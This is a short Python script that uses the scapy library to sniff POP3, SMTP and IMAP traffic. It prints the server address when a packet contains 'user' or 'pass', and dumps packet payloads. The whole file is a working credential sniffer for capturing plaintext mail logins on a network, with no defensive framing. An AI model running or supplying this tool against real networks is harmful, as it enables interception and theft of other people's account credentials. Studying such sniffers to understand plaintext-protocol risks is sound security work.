from scapy.all import *


def packet_callback(packet):
    if packet[TCP].payload:
        mail_packet = str(packet[TCP].payload).lower()
        if "user" in mail_packet or "pass" in mail_packet:
            print "Server : %s" % packet[IP].dst
        print "%s" % packet[TCP].payload
    print packet.show()

sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=packet_callback, store=0)